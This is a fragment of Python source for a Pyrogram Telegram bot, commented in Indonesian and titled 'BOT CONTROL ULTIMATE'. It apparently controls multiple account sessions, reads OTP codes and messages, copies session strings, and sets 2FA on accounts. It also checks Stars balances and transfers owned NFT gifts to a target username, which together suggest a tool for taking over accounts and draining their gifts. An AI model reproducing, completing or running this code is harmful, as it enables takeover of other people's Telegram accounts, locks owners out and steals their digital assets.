...
async def get_owned_gifts(app):
    try:
        resp = await app.invoke(raw.functions.messages.GetOwnedGifts())
        return resp.gifts
    except Exception as e:
...
async def get_stars_balance(app):
    try:
        resp = await app.invoke(raw.functions.payments.GetStarsStatus())
        return resp.balance
    except:
        return 0

async def transfer_nft_gift(app, gift_id, target_username):
    try:
        target = await app.get_users(target_username.strip().replace('@', ''))
        await app.invoke(
            raw.functions.messages.TransferGift(
                gift_id=gift_id,
                to_id=await app.resolve_peer(target.id)
            )
        )
        return True, f"✅ Gift berhasil ditransfer ke {target.first_name}!"
    except Exception as e:
        error = str(e)
        if "STARS_INSUFFICIENT" in error:
            return False, "❌ Saldo Stars tidak cukup! (butuh 25 Stars)"
...
# ==================== PERBAIKAN SET 2FA (RAW FUNCTION) ====================
async def set_2fa_password(app, new_password):
    try:
        # Cek apakah sudah ada 2FA
        pwd = await app.invoke(raw.functions.account.GetPassword())
        if pwd.has_password:
            return False, "❌ Akun sudah memiliki 2FA. Untuk mengubah, Anda perlu memasukkan password saat ini. Fitur ini hanya untuk membuat 2FA baru."
        # Buat password baru
        await app.invoke(
...
def gift_selection_menu(gifts, page=0, per_page=5):
    ...
    for i in range(start, end):
        g = gifts[i]
        gift_id = getattr(g, 'id', i)
        title = getattr(g, 'title', f"Gift #{gift_id}")
        extra = ""
        if hasattr(g, 'attributes'):
            attrs = []
            for attr in g.attributes:
                if hasattr(attr, 'title'):
                    attrs.append(attr.title[:10])
            if attrs:
                extra = f" ({', '.join(attrs)})"
        buttons.append([InlineKeyboardButton(f"🎁 {title}{extra}", callback_data=f"gift_transfer_{gift_id}")])
    nav = []
    if page > 0:
...
async def callback_handler(c, q: CallbackQuery):
    ...
    if data.startswith("gift_transfer_"):
        ...
        if not ud:
            ...
            return
        entry = waiting_input.get(uid)
        if not entry or not entry.get('target_username'):
            await q.answer("Target belum diatur!", show_alert=True)
            return
        target = entry['target_username']
        balance = await get_stars_balance(ud['app'])
        if balance < 25:
            # Kirim DM ke OWNER saja
            ...
            return
        success, msg = await transfer_nft_gift(ud['app'], gift_id, target)
        if success:
            await q.message.reply(msg)
        else:
            await q.message.reply(msg)
...
if __name__ == "__main__":
    print("=" * 70)
    print("🤖 BOT CONTROL ULTIMATE - FINAL")
    print("=" * 70)
    print("✅ FITUR LENGKAP:")
    ...
    print("   • 📡 OTP & PESAN")
    print("   • 🔐 SET/UBAH 2FA (raw function, fix error)")
    print("   • 📋 COPY SESSION STRING")
    print("   • 🌐 MULTI SESSION CONTROL")
    print("   • 🎁 TRANSFER NFT GIFT (yang dimiliki, biaya 25 Stars)")
